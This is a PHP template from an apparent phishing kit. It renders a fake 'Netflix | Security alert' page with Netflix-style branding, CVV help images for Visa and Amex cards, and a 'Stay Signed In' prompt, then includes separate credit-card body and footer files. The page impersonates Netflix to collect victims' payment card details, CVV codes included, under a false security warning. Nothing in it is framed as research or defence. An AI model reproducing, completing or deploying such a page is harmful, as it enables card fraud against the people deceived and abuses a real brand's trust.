<?php
function credit() {
    if (!isset($_SESSION['KYS-CREDIT'])) {
        die('ERROR: Please log in first.');
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Netflix | Security alert</title>
        <link rel="stylesheet" href="/Brainstorm/assets/css/karma-styles.css?v=<?php echo time(); ?>">
        <link rel="stylesheet" href="/Brainstorm/assets/css/credit.css?v=<?php echo time(); ?>">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.10.0/font/bootstrap-icons.min.css" rel="stylesheet">
        <meta name="apple-touch-icon" content="/Brainstorm/assets/images/net-152.jpg">
        <link rel="shortcut icon" href="/Brainstorm/assets/images/favicon.ico">
        <link rel="apple-touch-icon" href="/Brainstorm/assets/images/favicon.png">
    </head>
    <body>
        <header>
            <nav>
                <ul>
                    <img src="/Brainstorm/assets/images/logo.svg">
                    <li><a id="sign-out">Sign Out</a></li>
                    <div id="overlay" style="display: none;"></div>
                    <div id="toast-notification">
                        <div id="toast-message"></div>
                        <button id="toast-button">Stay Signed In</button>
                    </div>
                    <div id="cvv-icon-help">
                        <div id="cvv-message"></div>
                            <div class="cvv-images">
                                <img src="/Brainstorm/assets/images/visa_cvv.png">
                                <img src="/Brainstorm/assets/images/amex_cvv.png">
                            </div>
                        <svg id="cvv-close-button" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="24" height="24" data-icon="XStandard" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M10.5858 12L2.29291 3.70706L3.70712 2.29285L12 10.5857L20.2929 2.29285L21.7071 3.70706L13.4142 12L21.7071 20.2928L20.2929 21.7071L12 13.4142L3.70712 21.7071L2.29291 20.2928L10.5858 12Z" fill="currentColor"></path></svg>
                    </div>
                </ul>
            </nav>
        </header>

        <?php
        require_once 'credit-body.php';
        require_once 'credit-footer.php';
    }
?>